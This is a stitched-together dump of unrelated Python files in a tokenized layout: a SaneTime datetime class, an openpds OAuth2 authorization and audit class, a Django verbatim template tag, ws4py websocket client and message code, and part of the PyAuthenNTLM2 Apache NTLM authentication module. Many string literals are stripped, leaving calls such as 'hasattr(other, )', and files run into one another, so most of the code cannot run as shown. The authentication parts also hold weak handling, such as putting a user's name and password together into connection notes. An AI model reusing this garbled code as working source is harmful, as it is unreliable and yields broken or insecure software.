arg = arg . astimezone ( pytz . utc ) . replace ( tzinfo = None ) \n 
~~ ~~ ~~ if type ( arg ) == datetime : \n 
~~~ naive_dt = arg \n 
if naive_dt . tzinfo : \n 
~~~ tzs . add ( SaneTime . to_timezone ( str ( naive_dt . tzinfo ) ) ) \n 
naive_dt = naive_dt . replace ( tzinfo = None ) \n 
\n 
~~ ~~ ~~ if len ( tzs ) > 1 : \n 
~~~ raise TimeConstructionError ( "constructor arguments seem to specify more than one different timezone!  I can\'t possibly resolve that!  (timezones implied = %s)" % ( tzs ) ) \n 
\n 
# now we have enough info to figure out the tz: \n 
~~ self . tz = len ( tzs ) and tzs . pop ( ) or pytz . utc \n 
\n 
\n 
if naive_dt : \n 
~~~ if avoid_localize : \n 
~~~ uss . add ( SaneTime . utc_datetime_to_us ( naive_dt ) ) \n 
~~ else : \n 
~~~ uss . add ( SaneTime . utc_datetime_to_us ( self . tz . localize ( naive_dt ) . astimezone ( pytz . utc ) ) ) \n 
\n 
# if we got nothing yet for micros, then make it now \n 
~~ ~~ if len ( uss ) == 0 : \n 
~~~ uss . add ( SaneTime . utc_datetime_to_us ( datetime . utcnow ( ) ) ) \n 
\n 
~~ if len ( uss ) > 1 : \n 
~~~ raise TimeConstructionError ( "constructor arguments seem to specify more than one different time!  I can\'t possibly resolve that!  (micro times implied = %s)" % ( uss ) ) \n 
\n 
~~ self . us = uss . pop ( ) \n 
\n 
if len ( args ) > 0 : \n 
~~~ raise TimeConstructionError ( "Unexpected constructor arguments" ) \n 
\n 
\n 
~~ ~~ @ property \n 
def ms ( self ) : return self . us / MILLI_MICROS \n 
epoch_milliseconds = epoch_millis = milliseconds = millis = ms \n 
@ property \n 
def s ( self ) : return self . us / SECOND_MICROS \n 
epoch_seconds = epoch_secs = seconds = secs = s \n 
@ property \n 
def m ( self ) : return self . us / MINUTE_MICROS \n 
epoch_minutes = epoch_mins = minutes = mins = m \n 
@ property \n 
def micros ( self ) : return self . us \n 
epoch_microseconds = epoch_micros = microseconds = micros \n 
\n 
@ property \n 
def tz_name ( self ) : return self . tz . zone \n 
@ property \n 
def tz_abbr ( self ) : return self . tz . _tzname \n 
\n 
def set_tz ( self , tz ) : \n 
~~~ self . tz = self . __class__ . to_timezone ( tz ) ; return self \n 
~~ def with_tz ( self , tz ) : \n 
~~~ return self . __class__ ( self . us , tz ) \n 
\n 
\n 
~~ @ property \n 
def _tuple ( self ) : return ( self . us , self . tz ) \n 
\n 
def strftime ( self , * args , ** kwargs ) : return self . datetime . strftime ( * args , ** kwargs ) \n 
\n 
def __cmp__ ( self , other ) : \n 
~~~ if not hasattr ( other , ) : other = SaneTime ( other ) \n 
return cmp ( self . us , int ( other ) ) \n 
~~ def __hash__ ( self ) : return self . us . __hash__ ( ) \n 
\n 
def __add__ ( self , operand ) : \n 
~~~ if not hasattr ( operand , ) : operand = SaneTime ( operand ) \n 
return self . __class__ ( self . us + int ( operand ) , tz = self . tz ) \n 
~~ def __sub__ ( self , operand ) : \n 
~~~ if not hasattr ( operand , ) : operand = SaneTime ( operand ) \n 
if isinstance ( operand , SaneTime ) : return SaneDelta ( self . us - int ( operand ) ) \n 
return self . __add__ ( - int ( operand ) ) \n 
~~ def __mul__ ( self , operand ) : \n 
~~~ return self . us * int ( operand ) \n 
~~ def __div__ ( self , operand ) : \n 
~~~ return self . us / int ( operand ) \n 
\n 
~~ def __int__ ( self ) : return int ( self . us ) \n 
def __long__ ( self ) : return long ( self . us ) \n 
\n 
def __repr__ ( self ) : return u"SaneTime(%s,%s)" % ( self . us , repr ( self . tz ) ) \n 
def __str__ ( self ) : return unicode ( self ) . encode ( ) \n 
def __unicode__ ( self ) : \n 
~~~ dt = self . datetime \n 
micros = u".%06d" % dt . microsecond if dt . microsecond else \n 
time = u" %02d:%02d:%02d%s" % ( dt . hour , dt . minute , dt . second , micros ) if dt . microsecond or dt . second or dt . minute or dt . hour else \n 
return u"%04d-%02d-%02d%s +%s" % ( dt . year , dt . month , dt . day , time , dt . tzinfo . zone ) \n 
\n 
~~ def clone ( self ) : \n 
~~~ """ cloning stuff """ \n 
return self . __class__ ( self . us , self . tz ) \n 
\n 
~~ @ property \n 
def ny_str ( self ) : \n 
~~~ """ a ny string """ \n 
return self . ny_ndt . strftime ( ) \n 
\n 
~~ @ property \n 
def utc_datetime ( self ) : return SaneTime . us_to_utc_datetime ( self . us ) \n 
utc_dt = utc_datetime \n 
@ property \n 
def utc_naive_datetime ( self ) : return self . utc_datetime . replace ( tzinfo = None ) \n 
utc_ndt = utc_naive_datetime \n 
\n 
def to_timezoned_datetime ( self , tz ) : return self . utc_datetime . astimezone ( SaneTime . to_timezone ( tz ) ) \n 
def to_timezoned_naive_datetime ( self , tz ) : return self . to_timezoned_datetime ( tz ) . replace ( tzinfo = None ) \n 
\n 
@ property \n 
def datetime ( self ) : return self . to_timezoned_datetime ( self . tz ) \n 
dt = datetime \n 
@ property \n 
def naive_datetime ( self ) : return self . to_timezoned_naive_datetime ( self . tz ) \n 
ndt = naive_datetime \n 
\n 
@ property \n 
def ny_datetime ( self ) : return self . to_timezoned_datetime ( ) \n 
ny_dt = ny_datetime \n 
@ property \n 
def ny_naive_datetime ( self ) : return self . to_timezoned_naive_datetime ( ) \n 
ny_ndt = ny_naive_datetime \n 
\n 
\n 
\n 
@ property \n 
def year ( self ) : return self . dt . year \n 
@ property \n 
def month ( self ) : return self . dt . month \n 
@ property \n 
def day ( self ) : return self . dt . day \n 
@ property \n 
def hour ( self ) : return self . dt . hour \n 
@ property \n 
def minute ( self ) : return self . dt . minute \n 
@ property \n 
def second ( self ) : return self . dt . second \n 
@ property \n 
def microsecond ( self ) : return self . dt . microsecond \n 
\n 
#def add_datepart(self, months=None, years=None, auto_day_adjust=True): \n 
#months = (months or 0) + (years or 0) * 12 \n 
#dt = self.utc_dt \n 
#day = dt.day \n 
#month = dt.month + months%12 \n 
#year = dt.year + months/12 \n 
#if auto_day_adjust: \n 
#if day>=29 and month==2: \n 
#leap_year = year%4==0 and (not year%100==0 or year%400==0) \n 
#day = 29 if leap_year else 28 \n 
#elif day==31 and month in (4,6,9,11): \n 
#day = 30 \n 
#return SaneTime(fucked_datetime(year,month,day,dt.hour,dt.minute,dt.second,dt.microsecond,tz=pytz.utc)) \n 
\n 
@ classmethod \n 
def utc_datetime_to_us ( kls , dt ) : \n 
~~~ return calendar . timegm ( dt . timetuple ( ) ) * 1000 ** 2 + dt . microsecond \n 
\n 
~~ @ classmethod \n 
def us_to_utc_datetime ( kls , us ) : \n 
~~~ return pytz . utc . localize ( datetime . utcfromtimestamp ( us / 10 ** 6 ) ) . replace ( microsecond = us % 10 ** 6 ) \n 
\n 
~~ @ classmethod \n 
def to_timezone ( kls , tz ) : \n 
~~~ if not isinstance ( tz , basestring ) : return tz \n 
return pytz . timezone ( tz ) \n 
\n 
\n 
# null passthru utility \n 
~~ ~~ def ntime ( * args , ** kwargs ) : \n 
~~~ if args : \n 
~~~ if args [ 0 ] is None : return None \n 
~~ elif kwargs : \n 
~~~ if None in [ v for k , v in kwargs . iteritems ( ) if k != ] : return None \n 
~~ return SaneTime ( * args , ** kwargs ) \n 
\n 
#primary aliases \n 
~~ time = sanetime = SaneTime \n 
nsanetime = ntime \n 
\n 
from tastypie . authorization import Authorization \n 
from openpds . authentication import OAuth2Authentication \n 
from openpds . core . models import Profile , AuditEntry \n 
\n 
import settings \n 
import pdb \n 
import traceback \n 
\n 
class PDSAuthorization ( Authorization ) : \n 
~~~ audit_enabled = True \n 
scope = "" \n 
requester_uuid = "" \n 
\n 
def requester ( self ) : \n 
#        print self.requester_uuid \n 
~~~ return self . requester_uuid \n 
\n 
~~ def trustWrapper ( self , datastore_owner ) : \n 
~~~ print "checking trust wrapper" \n 
#ds_owner_profile = Profile.objects.get(uuid = datastore_owner_uuid) \n 
#print datastore_owner.sharinglevel_owner.get(isselected = True) \n 
\n 
~~ def is_authorized ( self , request , object = None ) : \n 
#        pdb.set_trace() \n 
~~~ authenticator = OAuth2Authentication ( self . scope ) \n 
if "datastore_owner__uuid" in request . REQUEST : \n 
~~~ authorized = True \n 
token = request . REQUEST [ "bearer_token" ] if "bearer_token" in request . REQUEST else request . META [ "HTTP_BEARER_TOKEN" ] \n 
# Result will be the uuid of the requesting party \n 
\n 
# Note: the trustwrapper must be run regardless of if auditting is enabled on this call or not \n 
\n 
datastore_owner_uuid = request . REQUEST [ "datastore_owner__uuid" ] \n 
datastore_owner , ds_owner_created = Profile . objects . get_or_create ( uuid = datastore_owner_uuid ) \n 
self . requester_uuid = authenticator . get_userinfo_from_token ( token , self . scope ) \n 
\n 
if self . requester_uuid is False or self . requester_uuid is None or len ( self . requester_uuid ) == 0 : \n 
~~~ self . requester_uuid = "not-specified" \n 
authorized = False \n 
\n 
~~ self . trustWrapper ( datastore_owner ) \n 
\n 
try : \n 
~~~ if ( self . audit_enabled ) : \n 
#pdb.set_trace() \n 
~~~ audit_entry = AuditEntry ( token = token ) \n 
audit_entry . method = request . method \n 
audit_entry . scope = self . scope \n 
audit_entry . purpose = request . REQUEST [ "purpose" ] if "purpose" in request . REQUEST else "" \n 
audit_entry . system_entity_toggle = request . REQUEST [ "system_entity" ] if "system_entity" in request . REQUEST else False \n 
# NOTE: datastore_owner and requester are required \n 
\n 
audit_entry . datastore_owner = datastore_owner \n 
audit_entry . requester , created = Profile . objects . get_or_create ( uuid = self . requester_uuid ) \n 
audit_entry . script = request . path \n 
audit_entry . save ( ) \n 
~~ ~~ except Exception as e : \n 
~~~ print e \n 
authorized = False \n 
\n 
~~ return authorized \n 
\n 
~~ return False \n 
\n 
~~ def __init__ ( self , scope , audit_enabled = True ) : \n 
#pdb.set_trace() \n 
~~~ self . scope = scope \n 
self . audit_enabled = audit_enabled \n 
\n 
# Optional but useful for advanced limiting, such as per user. \n 
# def apply_limits(self, request, object_list): \n 
\n 
#        return object_list.filter(author__username=request.user.username) \n 
# \n 
#    return object_list.none() \n 
\n 
~~ ~~ """\nFrom ericflo (https://gist.github.com/629508)\n\njQuery templates use constructs like:\n\n    {{if condition}} print something{{/if}}\n\nThis, of course, completely screws up Django templates,\nbecause Django thinks {{ and }} mean something.\n\nWrap {% verbatim %} and {% endverbatim %} around those\nblocks of jQuery templates and this will try its best\nto output the contents with no changes.\n""" \n 
\n 
from django import template \n 
\n 
register = template . Library ( ) \n 
\n 
\n 
class VerbatimNode ( template . Node ) : \n 
\n 
~~~ def __init__ ( self , text ) : \n 
~~~ self . text = text \n 
\n 
~~ def render ( self , context ) : \n 
~~~ return self . text \n 
\n 
\n 
~~ ~~ @ register . tag \n 
def verbatim ( parser , token ) : \n 
~~~ text = [ ] \n 
while 1 : \n 
~~~ token = parser . tokens . pop ( 0 ) \n 
if token . contents == : \n 
~~~ break \n 
~~ if token . token_type == template . TOKEN_VAR : \n 
~~~ text . append ( ) \n 
~~ elif token . token_type == template . TOKEN_BLOCK : \n 
~~~ text . append ( ) \n 
~~ text . append ( token . contents ) \n 
if token . token_type == template . TOKEN_VAR : \n 
~~~ text . append ( ) \n 
~~ elif token . token_type == template . TOKEN_BLOCK : \n 
~~~ text . append ( ) \n 
~~ ~~ return VerbatimNode ( . join ( text ) ) \n 
~~ from django . shortcuts import render_to_response \n 
from django . template import RequestContext \n 
import pdb \n 
\n 
# -*- coding: utf-8 -*- \n 
from gevent import monkey ; monkey . patch_all ( ) \n 
\n 
import gevent \n 
from ws4py . client . geventclient import WebSocketClient \n 
\n 
if __name__ == : \n 
~~~ ws = WebSocketClient ( , protocols = [ , ] ) \n 
ws . connect ( ) \n 
\n 
ws . send ( "Hello world" ) \n 
print ( ( ws . receive ( ) , ) ) \n 
\n 
ws . send ( "Hello world again" ) \n 
print ( ( ws . receive ( ) , ) ) \n 
\n 
def incoming ( ) : \n 
~~~ while True : \n 
~~~ m = ws . receive ( ) \n 
if m is not None : \n 
~~~ m = str ( m ) \n 
print ( ( m , len ( m ) ) ) \n 
if len ( m ) == 35 : \n 
~~~ ws . close ( ) \n 
break \n 
~~ ~~ else : \n 
~~~ break \n 
~~ ~~ print ( ( "Connection closed!" , ) ) \n 
\n 
~~ def outgoing ( ) : \n 
~~~ for i in range ( 0 , 40 , 5 ) : \n 
~~~ ws . send ( "*" * i ) \n 
\n 
\n 
~~ ws . send ( "Foobar" ) \n 
\n 
~~ greenlets = [ \n 
gevent . spawn ( incoming ) , \n 
gevent . spawn ( outgoing ) , \n 
] \n 
gevent . joinall ( greenlets ) \n 
# -*- coding: utf-8 -*- \n 
~~ import os \n 
import struct \n 
\n 
from ws4py . framing import Frame , OPCODE_CONTINUATION , OPCODE_TEXT , OPCODE_BINARY , OPCODE_CLOSE , OPCODE_PING , OPCODE_PONG \n 
from ws4py . compat import unicode , py3k \n 
\n 
__all__ = [ , , , , \n 
, ] \n 
\n 
class Message ( object ) : \n 
~~~ def __init__ ( self , opcode , data = , encoding = ) : \n 
~~~ """\n        A message is a application level entity. It\'s usually built\n        from one or many frames. The protocol defines several kind\n        of messages which are grouped into two sets:\n\n        * data messages which can be text or binary typed\n        * control messages which provide a mechanism to perform\n          in-band control communication between peers\n\n        The ``opcode`` indicates the message type and ``data`` is\n        the possible message payload.\n\n        The payload is held internally as a a :func:`bytearray` as they are\n        faster than pure strings for append operations.\n\n        Unicode data will be encoded using the provided ``encoding``.\n        """ \n 
self . opcode = opcode \n 
self . _completed = False \n 
self . encoding = encoding \n 
\n 
if isinstance ( data , unicode ) : \n 
~~~ if not encoding : \n 
~~~ raise TypeError ( "unicode data without an encoding" ) \n 
~~ data = data . encode ( encoding ) \n 
~~ elif isinstance ( data , bytearray ) : \n 
~~~ data = bytes ( data ) \n 
~~ elif not isinstance ( data , bytes ) : \n 
~~~ raise TypeError ( "%s is not a supported data type" % type ( data ) ) \n 
\n 
~~ self . data = data \n 
\n 
~~ def single ( self , mask = False ) : \n 
~~~ """\n        Returns a frame bytes with the fin bit set and a random mask.\n\n        If ``mask`` is set, automatically mask the frame\n        using a generated 4-byte token.\n        """ \n 
mask = os . urandom ( 4 ) if mask else None \n 
return Frame ( body = self . data , opcode = self . opcode , \n 
masking_key = mask , fin = 1 ) . build ( ) \n 
\n 
~~ def fragment ( self , first = False , last = False , mask = False ) : \n 
~~~ """\n        Returns a :class:`ws4py.framing.Frame` bytes.\n\n        The behavior depends on the given flags:\n\n        * ``first``: the frame uses ``self.opcode`` else a continuation opcode\n        * ``last``: the frame has its ``fin`` bit set\n        * ``mask``: the frame is masked using a automatically generated 4-byte token\n        """ \n 
fin = 1 if last is True else 0 \n 
opcode = self . opcode if first is True else OPCODE_CONTINUATION \n 
mask = os . urandom ( 4 ) if mask else None \n 
return Frame ( body = self . data , \n 
opcode = opcode , masking_key = mask , \n 
fin = fin ) . build ( ) \n 
\n 
~~ @ property \n 
def completed ( self ) : \n 
~~~ """\n        Indicates the the message is complete, meaning\n        the frame\'s ``fin`` bit was set.\n        """ \n 
return self . _completed \n 
\n 
~~ @ completed . setter \n 
def completed ( self , state ) : \n 
~~~ """\n        Sets the state for this message. Usually\n        set by the stream\'s parser.\n        """ \n 
self . _completed = state \n 
\n 
~~ def extend ( self , data ) : \n 
~~~ """\n        Add more ``data`` to the message.\n        """ \n 
if isinstance ( data , bytes ) : \n 
~~~ self . data += data \n 
~~ elif isinstance ( data , bytearray ) : \n 
~~~ self . data += bytes ( data ) \n 
~~ elif isinstance ( data , unicode ) : \n 
~~~ self . data += data . encode ( self . encoding ) \n 
~~ else : \n 
~~~ raise TypeError ( "%s is not a supported data type" % type ( data ) ) \n 
\n 
~~ ~~ def __len__ ( self ) : \n 
~~~ return len ( self . __unicode__ ( ) ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ if py3k : \n 
~~~ return self . data . decode ( self . encoding ) \n 
~~ return self . data \n 
\n 
~~ def __unicode__ ( self ) : \n 
~~~ return self . data . decode ( self . encoding ) \n 
\n 
~~ ~~ class TextMessage ( Message ) : \n 
~~~ def __init__ ( self , text = None ) : \n 
~~~ Message . __init__ ( self , OPCODE_TEXT , text ) \n 
\n 
~~ @ property \n 
def is_binary ( self ) : \n 
~~~ return False \n 
\n 
~~ @ property \n 
def is_text ( self ) : \n 
~~~ return True \n 
\n 
~~ ~~ class BinaryMessage ( Message ) : \n 
~~~ def __init__ ( self , bytes = None ) : \n 
~~~ Message . __init__ ( self , OPCODE_BINARY , bytes , encoding = None ) \n 
\n 
~~ @ property \n 
def is_binary ( self ) : \n 
~~~ return True \n 
\n 
~~ @ property \n 
def is_text ( self ) : \n 
~~~ return False \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . data ) \n 
\n 
~~ ~~ class CloseControlMessage ( Message ) : \n 
~~~ def __init__ ( self , code = 1000 , reason = ) : \n 
~~~ data = b"" \n 
if code : \n 
~~~ data += struct . pack ( "!H" , code ) \n 
~~ if reason is not None : \n 
~~~ if isinstance ( reason , unicode ) : \n 
~~~ reason = reason . encode ( ) \n 
~~ data += reason \n 
\n 
~~ Message . __init__ ( self , OPCODE_CLOSE , data , ) \n 
self . code = code \n 
self . reason = reason \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ if py3k : \n 
~~~ return self . reason . decode ( ) \n 
~~ return self . reason \n 
\n 
~~ def __unicode__ ( self ) : \n 
~~~ return self . reason . decode ( self . encoding ) \n 
\n 
~~ ~~ class PingControlMessage ( Message ) : \n 
~~~ def __init__ ( self , data = None ) : \n 
~~~ Message . __init__ ( self , OPCODE_PING , data ) \n 
\n 
~~ ~~ class PongControlMessage ( Message ) : \n 
~~~ def __init__ ( self , data ) : \n 
~~~ Message . __init__ ( self , OPCODE_PONG , data ) \n 
#!/usr/bin/env python \n 
# \n 
# PyAuthenNTLM2: A mod-python module for Apache that carries out NTLM authentication \n 
# \n 
# pyntlm.py \n 
# \n 
# Copyright 2011 Legrandin <helderijs@gmail.com> \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ import sys \n 
import base64 \n 
import time \n 
import urllib \n 
from struct import unpack \n 
from threading import Lock \n 
from binascii import hexlify \n 
from urlparse import urlparse \n 
\n 
from mod_python import apache \n 
from PyAuthenNTLM2 . ntlm_dc_proxy import NTLM_DC_Proxy \n 
from PyAuthenNTLM2 . ntlm_ad_proxy import NTLM_AD_Proxy \n 
\n 
use_basic_auth = True \n 
try : \n 
~~~ from PyAuthenNTLM2 . ntlm_client import NTLM_Client \n 
~~ except ImportError : \n 
~~~ use_basic_auth = False \n 
\n 
# \n 
# A connection can be in one of the following states when a request arrives: \n 
# \n 
# 1 Freshly opened: no authentication step has taken place yet. \n 
\n 
\n 
# \n 
# 2 Pending authentication: we sent the NTLM challenge to the client, and we  \n 
#   are waiting for the response. req.connection.notes does not contain the \n 
\n 
\n 
# \n 
# 3 Authenticated: all steps completed successfully.  \n 
\n 
\n 
\n 
# \n 
# Since connections may be interrupted before receiving the challenge, objects older \n 
# than 60 seconds are removed from cache when we have the chance. \n 
\n 
~~ class CacheConnections : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ self . _mutex = Lock ( ) \n 
self . _cache = { } \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . _cache ) \n 
\n 
~~ def remove ( self , id ) : \n 
~~~ self . _mutex . acquire ( ) \n 
( proxy , ts ) = self . _cache . get ( id , ( None , None ) ) \n 
if proxy : \n 
~~~ proxy . close ( ) \n 
del self . _cache [ id ] \n 
~~ self . _mutex . release ( ) \n 
\n 
~~ def add ( self , id , proxy ) : \n 
~~~ self . _mutex . acquire ( ) \n 
self . _cache [ id ] = ( proxy , int ( time . time ( ) ) ) \n 
self . _mutex . release ( ) \n 
\n 
~~ def clean ( self ) : \n 
~~~ now = int ( time . time ( ) ) \n 
self . _mutex . acquire ( ) \n 
for id , conn in self . _cache . items ( ) : \n 
~~~ if conn [ 1 ] + 60 < now : \n 
~~~ conn [ 0 ] . close ( ) \n 
del self . _cache [ id ] \n 
~~ ~~ self . _mutex . release ( ) \n 
\n 
~~ def has_key ( self , id ) : \n 
~~~ return self . _cache . has_key ( id ) \n 
\n 
~~ def get_proxy ( self , id ) : \n 
~~~ self . _mutex . acquire ( ) \n 
proxy = self . _cache [ id ] [ 0 ] \n 
self . _mutex . release ( ) \n 
return proxy \n 
\n 
~~ ~~ class CacheGroups : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ self . _mutex = Lock ( ) \n 
self . _cache = { } \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . _cache ) \n 
\n 
~~ def add ( self , group , user ) : \n 
~~~ self . _mutex . acquire ( ) \n 
if not self . _cache . has_key ( group ) : \n 
~~~ self . _cache [ group ] = { } \n 
~~ self . _cache [ group ] [ user ] = int ( time . time ( ) ) \n 
self . _mutex . release ( ) \n 
\n 
~~ def clean ( self ) : \n 
~~~ now = int ( time . time ( ) ) \n 
self . _mutex . acquire ( ) \n 
old = [ ] \n 
for group , members in self . _cache . items ( ) : \n 
~~~ for user in members : \n 
~~~ if members [ user ] + 3 * 60 * 60 < now : \n 
~~~ old . append ( ( group , user ) ) \n 
~~ ~~ ~~ for group , user in old : \n 
~~~ del self . _cache [ group ] [ user ] \n 
~~ self . _mutex . release ( ) \n 
\n 
~~ def has ( self , group , user ) : \n 
~~~ if not self . _cache . has_key ( group ) : \n 
~~~ return False \n 
~~ return self . _cache [ group ] . has_key ( user ) \n 
\n 
~~ ~~ cache = CacheConnections ( ) \n 
cacheGroups = CacheGroups ( ) \n 
\n 
def ntlm_message_type ( msg ) : \n 
~~~ if not msg . startswith ( ) or len ( msg ) < 12 : \n 
~~~ raise RuntimeError ( "Not a valid NTLM message: \'%s\'" % hexlify ( msg ) ) \n 
~~ msg_type = unpack ( , msg [ 8 : 8 + 4 ] ) [ 0 ] \n 
if msg_type not in ( 1 , 2 , 3 ) : \n 
~~~ raise RuntimeError ( "Incorrect NTLM message Type: %d" % msg_type ) \n 
~~ return msg_type \n 
\n 
~~ def parse_ntlm_authenticate ( msg ) : \n 
~~~ \n 
\n 
NTLMSSP_NEGOTIATE_UNICODE = 0x00000001 \n 
idx = 28 \n 
length , offset = unpack ( , msg [ idx : idx + 8 ] ) \n 
domain = msg [ offset : offset + length ] \n 
idx += 8 \n 
length , offset = unpack ( , msg [ idx : idx + 8 ] ) \n 
username = msg [ offset : offset + length ] \n 
idx += 24 \n 
flags = unpack ( , msg [ idx : idx + 4 ] ) [ 0 ] \n 
if flags & NTLMSSP_NEGOTIATE_UNICODE : \n 
~~~ domain = str ( domain . decode ( ) ) \n 
username = str ( username . decode ( ) ) \n 
~~ return username , domain \n 
\n 
~~ def set_remote_user ( req , username , domain ) : \n 
~~~ format = req . get_options ( ) . get ( , ) . lower ( ) \n 
if format == : \n 
~~~ req . user = domain + + username \n 
~~ else : \n 
~~~ req . user = username \n 
\n 
~~ ~~ def decode_http_authorization_header ( auth ) : \n 
~~~ \n 
ah = auth . split ( ) \n 
if len ( ah ) == 2 : \n 
~~~ b64 = base64 . b64decode ( ah [ 1 ] ) \n 
if ah [ 0 ] == : \n 
~~~ return ( , b64 ) \n 
~~ elif ah [ 0 ] == and use_basic_auth : \n 
~~~ ( user , password ) = b64 . split ( ) \n 
return ( , user , password ) \n 
~~ ~~ return False \n 
\n 
~~ def handle_unauthorized ( req ) : \n 
~~~ \n 
\n 
req . err_headers_out . add ( , ) \n 
if use_basic_auth : \n 
~~~ req . err_headers_out . add ( , \'Basic realm="%s"\' % req . auth_name ( ) ) \n 
~~ req . err_headers_out . add ( , ) \n 
return apache . HTTP_UNAUTHORIZED \n 
\n 
~~ def connect_to_proxy ( req , type1 ) : \n 
~~~ \n 
\n 
# Get configuration entries in Apache file \n 
try : \n 
~~~ domain = req . get_options ( ) [ ] \n 
pdc = req . get_options ( ) [ ] \n 
bdc = req . get_options ( ) . get ( , False ) \n 
~~ except KeyError , e : \n 
~~~ req . log_error ( % str ( e ) , apache . APLOG_CRIT ) \n 
raise \n 
~~ ntlm_challenge = None \n 
for server in ( pdc , bdc ) : \n 
~~~ if not server : continue \n 
try : \n 
~~~ if server . startswith ( ) : \n 
~~~ url = urlparse ( server ) \n 
decoded_path = urllib . unquote ( url . path ) [ 1 : ] \n 
req . log_error ( \'PYTNLM: Initiating connection to Active Directory server %s (domain %s) using base DN "%s".\' % \n 
( url . netloc , domain , decoded_path ) , apache . APLOG_INFO ) \n 
proxy = NTLM_AD_Proxy ( url . netloc , domain , base = decoded_path ) \n 
~~ else : \n 
~~~ req . log_error ( % \n 
( server , domain ) , apache . APLOG_INFO ) \n 
proxy = NTLM_DC_Proxy ( server , domain ) \n 
~~ ntlm_challenge = proxy . negotiate ( type1 ) \n 
~~ except Exception , e : \n 
~~~ req . log_error ( % ( server , str ( e ) ) , apache . APLOG_CRIT ) \n 
~~ if ntlm_challenge : break \n 
proxy . close ( ) \n 
~~ else : \n 
~~~ raise RuntimeError ( "None of the Domain Controllers are available." ) \n 
~~ return ( proxy , ntlm_challenge ) \n 
\n 
~~ def handle_type1 ( req , ntlm_message ) : \n 
~~~ \n 
cache . remove ( req . connection . id ) \n 
cache . clean ( ) \n 
\n 
try : \n 
~~~ ( proxy , ntlm_challenge ) = connect_to_proxy ( req , ntlm_message ) \n 
~~ except Exception , e : \n 
~~~ return apache . HTTP_INTERNAL_SERVER_ERROR \n 
\n 
~~ cache . add ( req . connection . id , proxy ) \n 
req . err_headers_out . add ( , "NTLM " + base64 . b64encode ( ntlm_challenge ) ) \n 
return apache . HTTP_UNAUTHORIZED \n 
\n 
~~ def check_authorization ( req , username , proxy ) : \n 
~~~ \n 
\n 
rules = . join ( req . requires ( ) ) . strip ( ) \n 
if rules == or cacheGroups . has ( rules , username ) : \n 
~~~ return True \n 
~~ groups = [ ] \n 
for r in req . requires ( ) : \n 
~~~ if r . lower ( ) . startswith ( "user " ) : \n 
~~~ users = [ u . strip ( ) for u in r [ 5 : ] . split ( "," ) ] \n 
if username in users : \n 
~~~ req . log_error ( % \n 
( username , req . unparsed_uri ) , apache . APLOG_INFO ) \n 
return True \n 
~~ ~~ if r . lower ( ) . startswith ( "group " ) : \n 
~~~ groups += [ g . strip ( ) for g in r [ 6 : ] . split ( "," ) ] \n 
\n 
~~ ~~ if groups : \n 
~~~ try : \n 
~~~ res = proxy . check_membership ( username , groups ) \n 
~~ except Exception , e : \n 
~~~ req . log_error ( % ( username , str ( groups ) , req . unparsed_uri , str ( e ) ) ) \n 
~~ if res : \n 
\n 
~~~ cacheGroups . add ( rules , username ) \n 
\n 
req . log_error ( % \n 
( username , str ( groups ) , req . unparsed_uri ) , apache . APLOG_INFO ) \n 
return True \n 
~~ req . log_error ( % \n 
( username , str ( groups ) , req . unparsed_uri ) ) \n 
~~ else : \n 
~~~ req . log_error ( % \n 
( username , req . unparsed_uri ) ) \n 
~~ return False \n 
\n 
~~ def handle_type3 ( req , ntlm_message ) : \n 
~~~ \n 
\n 
proxy = cache . get_proxy ( req . connection . id ) \n 
try : \n 
~~~ user , domain = parse_ntlm_authenticate ( ntlm_message ) \n 
if not domain : \n 
~~~ domain = req . get_options ( ) . get ( , req . auth_name ( ) ) \n 
~~ result = proxy . authenticate ( ntlm_message ) \n 
~~ except Exception , e : \n 
~~~ req . log_error ( % str ( e ) , apache . APLOG_CRIT ) \n 
user , domain = , \n 
result = False \n 
~~ if not result : \n 
~~~ cache . remove ( req . connection . id ) \n 
req . log_error ( % ( \n 
domain , user , req . unparsed_uri ) ) \n 
return handle_unauthorized ( req ) \n 
\n 
~~ req . log_error ( % ( user , domain , req . unparsed_uri ) , apache . APLOG_NOTICE ) \n 
set_remote_user ( req , user , domain ) \n 
result = check_authorization ( req , user , proxy ) \n 
cache . remove ( req . connection . id ) \n 
\n 
if not result : \n 
~~~ return apache . HTTP_FORBIDDEN \n 
\n 
~~ req . connection . notes . add ( , req . user ) \n 
return apache . OK \n 
\n 
~~ def handle_basic ( req , user , password ) : \n 
~~~ \n 
req . log_error ( % ( req . unparsed_uri ) ) \n 
\n 
domain = req . get_options ( ) . get ( , req . auth_name ( ) ) \n 
client = NTLM_Client ( user , domain , password ) \n 
type1 = client . make_ntlm_negotiate ( ) \n 
\n 
try : \n 
~~~ ( proxy , type2 ) = connect_to_proxy ( req , type1 ) \n 
~~ except Exception , e : \n 
~~~ return apache . HTTP_INTERNAL_SERVER_ERROR \n 
\n 
~~ client . parse_ntlm_challenge ( type2 ) \n 
type3 = client . make_ntlm_authenticate ( ) \n 
if not proxy . authenticate ( type3 ) : \n 
~~~ proxy . close ( ) \n 
req . log_error ( % ( \n 
user , domain , req . unparsed_uri ) ) \n 
return handle_unauthorized ( req ) \n 
\n 
~~ req . log_error ( % ( user , domain , req . unparsed_uri ) , apache . APLOG_NOTICE ) \n 
set_remote_user ( req , user , domain ) \n 
result = check_authorization ( req , user , proxy ) \n 
proxy . close ( ) \n 
\n 
if not result : \n 
~~~ return apache . HTTP_FORBIDDEN \n 
\n 
~~ req . connection . notes . add ( , user + password ) \n 
return apache . OK \n 
\n 
~~ def authenhandler ( req ) : \n 
~~~ \n 
req . log_error ( "PYNTLM: Handling connection 0x%X for %s URI %s. %d entries in connection cache." % ( \n 
req . connection . id , req . method , req . unparsed_uri , len ( cache ) ) , apache . APLOG_INFO ) \n 
\n 
